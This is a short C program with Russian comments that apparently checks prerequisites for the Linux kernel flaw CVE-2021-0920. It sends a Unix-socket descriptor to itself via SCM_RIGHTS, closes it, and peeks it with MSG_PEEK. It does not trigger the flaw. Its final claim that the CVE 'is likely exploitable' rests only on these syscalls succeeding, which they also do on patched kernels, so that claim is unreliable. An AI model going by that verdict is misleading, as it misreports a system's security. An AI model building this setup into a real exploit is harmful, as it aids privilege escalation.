#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <errno.h>

// Функция для отправки файлового дескриптора через SCM_RIGHTS
void send_fd(int socket, int fd) {
    struct msghdr msg = {0};
    char buf[CMSG_SPACE(sizeof(int))];
    memset(buf, 0, sizeof(buf));
    struct iovec io = { .iov_base = (void*)"", .iov_len = 1 };
    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    msg.msg_control = buf;
    msg.msg_controllen = sizeof(buf);
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    memcpy(CMSG_DATA(cmsg), &fd, sizeof(int));
    if (sendmsg(socket, &msg, 0) < 0) {
        perror("[-] sendmsg (SCM_RIGHTS) failed");
        exit(1);
    }
}

int main() {
    printf("[*] Checking prerequisites for CVE-2021-0920...\n");

    // 1. Создаем пару Unix-сокетов
    int sv[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
        perror("[-] socketpair failed");
        return 1;
    }
    printf("[+] socketpair created: %d, %d\n", sv[0], sv[1]);

    // 2. Отправляем дескриптор sv[0] самому себе через SCM_RIGHTS
    send_fd(sv[0], sv[0]);
    printf("[+] File descriptor sent via SCM_RIGHTS\n");

    // 3. Закрываем исходный дескриптор, чтобы создать ситуацию "в полете"
    close(sv[0]);
    printf("[+] Original fd closed\n");

    // 4. Пытаемся "подглядеть" дескриптор с MSG_PEEK
    char buf[1];
    struct iovec io = { .iov_base = buf, .iov_len = sizeof(buf) };
    struct msghdr msg = {0};
    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    char cmsg_buf[CMSG_SPACE(sizeof(int))];
    msg.msg_control = cmsg_buf;
    msg.msg_controllen = sizeof(cmsg_buf);

    printf("[*] Calling recvmsg with MSG_PEEK...\n");
    ssize_t n = recvmsg(sv[1], &msg, MSG_PEEK);
    if (n < 0) {
        perror("[-] recvmsg (MSG_PEEK) failed");
        return 1;
    }
    printf("[+] recvmsg returned %zd bytes\n", n);

    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    if (cmsg && cmsg->cmsg_type == SCM_RIGHTS) {
        int received_fd;
        memcpy(&received_fd, CMSG_DATA(cmsg), sizeof(int));
        printf("[+] Received fd via MSG_PEEK: %d\n", received_fd);
    } else {
        printf("[!] No SCM_RIGHTS control message found (unexpected)\n");
    }

    printf("[*] All prerequisite syscalls succeeded. CVE-2021-0920 is likely exploitable.\n");
    return 0;
}